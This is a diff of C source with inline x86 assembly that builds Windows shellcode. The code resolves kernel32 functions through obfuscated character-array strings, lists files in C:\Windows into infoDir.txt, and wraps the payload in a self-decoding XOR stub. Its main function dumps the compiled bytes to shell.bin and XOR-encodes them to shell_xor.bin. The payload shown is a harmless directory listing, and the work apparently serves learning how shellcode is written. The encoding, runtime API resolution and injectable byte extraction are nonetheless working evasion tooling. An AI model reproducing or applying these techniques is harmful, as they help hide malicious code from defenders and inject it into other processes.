@@ -18,6 +18,11 @@
 #define MAX_PATH 260
 #define INVALID_HANDLE_VALUE ((void *)(long)-1)
 
+//#define _Deref_pre_readonly_                    _SAL1_1_Source_(_Deref_pre_readonly_, (), _Deref_pre1_impl_(__readaccess_impl_notref))
+//#define _In_reads_bytes_opt_(size)     _SAL2_Source_(_In_reads_bytes_opt_, (size), _Pre_opt_bytecount_(size)  _Deref_pre_readonly_)
+
+
+
 #define _FILE_DEFINED
 typedef struct _iobuf
 {
@@ -280,37 +285,72 @@ typedef unsigned long       DWORD;
 typedef DWORD near* PDWORD;
 typedef _W64 unsigned long ULONG_PTR, * PULONG_PTR;
 typedef ULONG_PTR SIZE_T, * PSIZE_T;
+typedef _W64 long LONG_PTR, * PLONG_PTR;
+
+
+#define GENERIC_WRITE                    (0x40000000L)
+#define CREATE_ALWAYS       2
+#define FILE_ATTRIBUTE_NORMAL               0x00000080 
+#define INVALID_HANDLE_VALUE ((void*)(LONG_PTR)-1)
+typedef DWORD far* LPDWORD;
+
+typedef struct _OVERLAPPED {
+	ULONG_PTR Internal;
+	ULONG_PTR InternalHigh;
+	union {
+		struct {
+			DWORD Offset;
+			DWORD OffsetHigh;
+		} DUMMYSTRUCTNAME;
+		void* Pointer;
+	} DUMMYUNIONNAME;
+
+	HANDLE  hEvent;
+} OVERLAPPED, * LPOVERLAPPED;
+
+typedef struct _SECURITY_ATTRIBUTES {
+	DWORD nLength;
+	LPVOID lpSecurityDescriptor;
+	int bInheritHandle;
+} SECURITY_ATTRIBUTES, * PSECURITY_ATTRIBUTES, * LPSECURITY_ATTRIBUTES;
+
+int f_strlen(const char* str) {
+	unsigned int len = 0;
+	while (*str++) len++;
+	return len;
+}
 
 void __stdcall shellcode();
 
 void temp() {
 	__asm {
-		push eax
-		push edx
-		push ebx
-
 		xor edx, edx
-		add edx, 120
-		add edx, 120
-		add edx, 120
-		add edx, 120
-		add edx, 116
+		add edx, 112
+		add edx, 61
+		add edx, 64
+		add edx, 64
+		add edx, 64
+		add edx, 64
+		add edx, 64
+		add edx, 55
+		add edx, 34
+		add edx, 38
+		add edx, 78
+		add edx, 65
+		add edx, 69
 		mov eax, esp
-		add eax, 64
+		add eax, 70
 		Hassmen:
 			mov ebx, [eax]
-			xor ebx, 0xEEEEEEEE
+			xor ebx, 0xAAAAAAAA
 			mov [eax], ebx
 			add eax, 4
 			sub edx, 4
 			jnz Hassmen
-
-			pop ebx
-			pop edx
-			pop eax
 	}
 	shellcode();
 }
+
 
 void __stdcall shellcode() {
 	unsigned short baseString[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', '\0'};
@@ -318,59 +358,101 @@ void __stdcall shellcode() {
 
 	const char func1String[] = { 'F', 'i', 'n', 'd', 'F','i', 'r', 's', 't', 'F', 'i', 'l', 'e', 'A', '\0' };
 	LPVOID func1 = get_func_by_name((HMODULE)base, (LPSTR)func1String);
-
-	const char func2String[] = { 'F', 'i', 'n', 'd', 'N','e', 'x', 't', 'F', 'i', 'l', 'e', 'A', '\0' };
-	LPVOID func2 = get_func_by_name((HMODULE)base, (LPSTR)func2String);
-
-	const char func3String[] = { 'F', 'i', 'n', 'd', 'C', 'l', 'o', 's', 'e', '\0' };
-	LPVOID func3 = get_func_by_name((HMODULE)base, (LPSTR)func3String);
-
 	HMODULE(WINAPI * f_FindFirstFileA)
 		(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData) = (HMODULE(WINAPI*)(LPCSTR, LPWIN32_FIND_DATAA))func1;
 
+	const char func2String[] = { 'F', 'i', 'n', 'd', 'N','e', 'x', 't', 'F', 'i', 'l', 'e', 'A', '\0' };
+	LPVOID func2 = get_func_by_name((HMODULE)base, (LPSTR)func2String);
 	HMODULE(WINAPI * f_FindNextFileA)
 		(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData) = (HMODULE(WINAPI*)(HANDLE, LPWIN32_FIND_DATAA))func2;
 
+	const char func3String[] = { 'F', 'i', 'n', 'd', 'C', 'l', 'o', 's', 'e', '\0' };
+	LPVOID func3 = get_func_by_name((HMODULE)base, (LPSTR)func3String);
 	HMODULE(WINAPI * f_FindClose)
 		(HANDLE hFindFile) = (HMODULE(WINAPI*)(HANDLE))func3;
 	
-	WIN32_FIND_DATAA FindFileData;
+	const char func4String[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', '\0'};
+	LPVOID func4 = get_func_by_name((HMODULE)base, (LPSTR)func4String);
+	HMODULE(WINAPI * f_CreateFileA)
+		(LPCSTR lpFileName,
+			DWORD dwDesiredAccess,
+			DWORD dwShareMode,
+			LPSECURITY_ATTRIBUTES lpSecurityAttributes,
+			DWORD dwCreationDisposition,
+			DWORD dwFlagsAndAttributes,
+			HANDLE hTemplateFile) = (HMODULE(WINAPI*)(DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))func4;
+	
+	const char func5String[] = { 'W', 'r', 'i', 't', 'e', 'F', 'i', 'l', 'e', '\0' };
+	LPVOID func5 = get_func_by_name((HMODULE)base, (LPSTR)func5String);
+	HMODULE(WINAPI * f_WriteFile)
+		(HANDLE hFile,
+			const void* lpBuffer,
+			DWORD nNumberOfBytesToWrite,
+			LPDWORD lpNumberOfBytesWritten,
+			LPOVERLAPPED lpOverlapped) = (HMODULE(WINAPI*)(const void*, DWORD, LPDWORD, LPOVERLAPPED))func5;
+
+	const char func6String[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\0'};
+	LPVOID func6 = get_func_by_name((HMODULE)base, (LPSTR)func6String);
+	HMODULE(WINAPI * f_CloseHandle)
+		(HANDLE hObject) = (HMODULE(WINAPI*)(HANDLE))func6;
+
 	const char startDir[] = { 'C',':','\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', '*', '\0' };
+	WIN32_FIND_DATAA FindFileData;
 	void* hf = f_FindFirstFileA(startDir, &FindFileData);
-	if (hf == INVALID_HANDLE_VALUE) return;
 
 	const char fileString[] = { 'i', 'n', 'f', 'o', 'D', 'i', 'r', '.', 't', 'x', 't', '\0' };
-	const char mode[] = { 'w', '\0' };
-	FILE* file = fopen(fileString, mode);
+	HANDLE hFile = f_CreateFileA(
+		fileString,
+		GENERIC_WRITE,
+		0,
+		NULL,
+		CREATE_ALWAYS,
+		FILE_ATTRIBUTE_NORMAL,
+		NULL
+	);
 
+	DWORD bytesWritten;
 	int i = 0;
-	char ch = '\n';
+	const char ch[] = {'\n', '\0'};
 	do {
 		if (i > 1) {
-			fputs(FindFileData.cFileName, file);
-			fputc(ch, file);
+			f_WriteFile(
+				hFile,
+				FindFileData.cFileName,
+				f_strlen(FindFileData.cFileName),
+				&bytesWritten,
+				NULL
+			);
+			f_WriteFile(
+				hFile,
+				ch,
+				f_strlen(ch),
+				&bytesWritten,
+				NULL
+			);
 		}
 		i++;
 	} while (f_FindNextFileA(hf, &FindFileData));
 	f_FindClose(hf);
-	fclose(file);
+
+	f_CloseHandle(hFile);
 }
 
 void shellcodeEND() {}
 
 int main() {
-	//shellcode();
 	FILE* out = fopen("shell.bin", "w");
 	fwrite(temp, (int)shellcodeEND - (int)temp, 1, out);
 	fclose(out);
 
-	char myXor = 0xEE;
-	int mySize = 641;
-	int offset = 48;
+	char myXor = 0xAA;
+	int mySize = 897;
+	int offset = 66;
 
 	FILE* bin = fopen("shell.bin", "rb");
 	FILE* xorBin = fopen("shell_xor.bin", "wb");
-	unsigned char buf[642];
+	unsigned char buf[898];
+	buf[897] = '\0';
 
 	fread(buf, sizeof(char), mySize, bin);
 	for (int i = offset; i < mySize; i++)
